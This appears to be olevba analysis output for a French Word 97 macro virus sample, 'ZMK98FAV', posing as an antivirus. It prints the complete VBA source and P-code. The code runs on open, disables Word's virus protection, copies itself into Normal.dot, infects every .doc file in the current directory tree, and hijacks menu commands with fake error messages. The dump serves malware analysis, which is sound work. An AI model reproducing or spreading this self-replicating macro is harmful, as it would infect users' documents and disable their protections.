olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ZMK98FAV.bas 
in file: Virus.MSWord.Zmk.a - OLE stream: 'Macros/VBA/ZMK98FAV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "ZMK98FAV" Then
        ZMK98FAVInstalled = -1
    End If
Next i
If Not ZMK98FAVInstalled Then
    MsgBox "Je suis un nouveau AntiVirus pour Word 97", vbInformation, "ZMK98FAV"
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
    StatusBar = "Analyse du répertoire: " & CurDir & " pour trouver des fichier DOC..."
    For i = 1 To 500000
    Next i
    With Application.FileSearch
    If .Execute() > 0 Then
        .FileName = "*.doc"
        .LookIn = CurDir
        .SearchSubFolders = True
        For i = 1 To .FoundFiles.Count
            StatusBar = "Analyse de " & .FoundFiles(i) & " en cours..."
            Documents.Open FileName:=.FoundFiles(i)
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
            ActiveDocument.Save
            StatusBar = "Analyse de " & .FoundFiles(i) & " terminé..."
        Next i
        MsgBox "Analyse du répertoire " & CurDir & " terminé!!!" & Chr$(13) & "Les " & .FoundFiles.Count & " fichiers analysés sont infectés par moi" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "ZMK98FAV"
        StatusBar = "[ZMK98FAV] ZeMacroKiller98 Faux AntiVirus, HAHAHAHAHA!!!!"
        Application.Run MacroName:="FichierFermerTout"
    Else
        MsgBox "Pas de fichier DOC trouvé dans " & CurDir, vbInformation, "ZMK98FAV"
        MsgBox "Mais moi, je vous ai infecté..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbCritical, "ZMK98FAV"
    End If
    End With
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
MsgBox "Vous feriez mieux d'acheter un VRAI ANTIVIRUS..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbCritical, "ZMK98FAV"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Espace Pile Insuffisant.", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    ZMK98BM.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ZMK98BM.frm 
in file: Virus.MSWord.Zmk.a - OLE stream: 'Macros/VBA/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload ZMK98BM
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zmk.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1125 bytes
' Macros/VBA/ZMK98FAV - 9664 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAO 
' Line #6:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #8:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "ZMK98FAV"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ZMK98FAVInstalled 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Ld ZMK98FAVInstalled 
' 	Not 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0029 "Je suis un nouveau AntiVirus pour Word 97"
' 	Ld vbInformation 
' 	LitStr 0x0008 "ZMK98FAV"
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "ZMK98FAV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "ZMK98BM"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #16:
' 	LitStr 0x0017 "Analyse du répertoire: "
' 	Ld CurDir 
' 	Concat 
' 	LitStr 0x0020 " pour trouver des fichier DOC..."
' 	Concat 
' 	St StatusBar 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #20:
' 	ArgsMemLdWith Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #22:
' 	Ld CurDir 
' 	MemStWith LookIn 
' Line #23:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #25:
' 	LitStr 0x000B "Analyse de "
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Concat 
' 	LitStr 0x000C " en cours..."
' 	Concat 
' 	St StatusBar 
' Line #26:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "ZMK98FAV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #28:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "ZMK98BM"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	LitStr 0x000B "Analyse de "
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Concat 
' 	LitStr 0x000B " terminé..."
' 	Concat 
' 	St StatusBar 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	LitStr 0x0016 "Analyse du répertoire "
' 	Ld CurDir 
' 	Concat 
' 	LitStr 0x000B " terminé!!!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0004 "Les "
' 	Concat 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	Concat 
' 	LitStr 0x0028 " fichiers analysés sont infectés par moi"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000E "HAHAHAHAHA!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x0008 "ZMK98FAV"
' 	ArgsCall MsgBox 0x0003 
' Line #33:
' 	LitStr 0x0039 "[ZMK98FAV] ZeMacroKiller98 Faux AntiVirus, HAHAHAHAHA!!!!"
' 	St StatusBar 
' Line #34:
' 	LitStr 0x0011 "FichierFermerTout"
' 	ParamNamed MacroName 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	LitStr 0x001F "Pas de fichier DOC trouvé dans "
' 	Ld CurDir 
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0008 "ZMK98FAV"
' 	ArgsCall MsgBox 0x0003 
' Line #37:
' 	LitStr 0x001F "Mais moi, je vous ai infecté..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000F "HAHAHAHAHA!!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x0008 "ZMK98FAV"
' 	ArgsCall MsgBox 0x0003 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndWith 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Label ErrorAO 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub FileSaveAs())
' Line #44:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #45:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #47:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #48:
' 	OnError ErrorFSA 
' Line #49:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #50:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #51:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "ZMK98FAV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #54:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "ZMK98BM"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #55:
' 	LitStr 0x0030 "Vous feriez mieux d'acheter un VRAI ANTIVIRUS..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000F "HAHAHAHAHA!!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x0008 "ZMK98FAV"
' 	ArgsCall MsgBox 0x0003 
' Line #56:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' 	Label ErrorFSA 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub FileTemplates())
' Line #60:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #61:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #62:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #63:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #64:
' 	OnError ErrorFT 
' Line #65:
' 	LitStr 0x0018 "Espace Pile Insuffisant."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #66:
' 	Label ErrorFT 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub ToolsMacro())
' Line #69:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #70:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #71:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #72:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #73:
' 	OnError ErrorTM 
' Line #74:
' 	Ld ZMK98BM 
' 	ArgsMemCall Show 0x0000 
' Line #75:
' 	Label ErrorTM 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub ViewVBCode())
' Line #78:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #79:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #80:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #81:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #82:
' 	OnError ErrorVVBC 
' Line #83:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #84:
' 	Label ErrorVVBC 
' Line #85:
' 	EndSub 
' Macros/VBA/ZMK98BM - 2685 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld ZMK98BM 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Je suis un Faux AntiVirus cr�e par ZeMacroKiller98A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tous les fichier DOC de votre disque sont infect�...I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J'esp�re que vous avez un VRAI ANTIVIRUS...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HAHAHAHAHA!!!!!!, que je suis dr�le, n'est ce pas ?...D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PERSONNE N'EST A L'ABRI DES VIRUS...�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.a' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

